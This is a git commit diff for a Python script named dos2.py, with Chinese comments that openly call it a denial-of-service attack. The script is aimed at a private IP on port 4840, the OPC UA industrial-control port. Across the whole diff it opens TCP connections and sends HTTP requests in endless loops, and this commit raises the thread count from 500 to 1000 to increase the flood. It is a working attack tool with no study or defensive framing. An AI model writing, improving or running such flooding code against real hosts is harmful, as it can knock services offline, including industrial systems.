61c5a994eedfb0fb5b28d45fe5ec12f3ccf63b08
Ctrl-ux <3126087032@qq.com>
2024-12-31 10:11:17 +0800

    Update dos2.py

--- dos2.py
+++ dos2.py
@@ -5,22 +5,26 @@ import threading
 target_ip = '10.4.3.195'  # 替换为实际的目标IP
 target_port = 4840  # 替换为实际的目标端口
 
-# DoS攻击函数
-def dos_attack():
+def dos_attack(ip, port):
     while True:
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.connect((target_ip, target_port))
-            s.sendto(("GET / HTTP/1.1\r\n").encode('ascii'), (target_ip, target_port))
-            s.sendto(("Host: " + target_ip + "\r\n\r\n").encode('ascii'), (target_ip, target_port))
+            s.settimeout(5)  # 设置超时时间为5秒
+            s.connect((ip, port))
+            s.sendto(("GET / HTTP/1.1\r\n").encode('ascii'), (ip, port))
+            s.sendto(("Host: " + ip + "\r\n\r\n").encode('ascii'), (ip, port))
             s.close()
+            print(f"Successfully sent request to {ip}:{port}")
+        except ConnectionRefusedError:
+            print(f"Connection to {ip}:{port} refused")
         except Exception as e:
             print(f"An error occurred: {e}")
 
 # 创建多个线程进行攻击
 threads = []
-for i in range(500):  # 你可以调整线程的数量
-    thread = threading.Thread(target=dos_attack)
+num_threads = 1000  # 你可以调整线程的数量
+for i in range(num_threads):
+    thread = threading.Thread(target=dos_attack, args=(target_ip, target_port))
     threads.append(thread)
     thread.start()
 
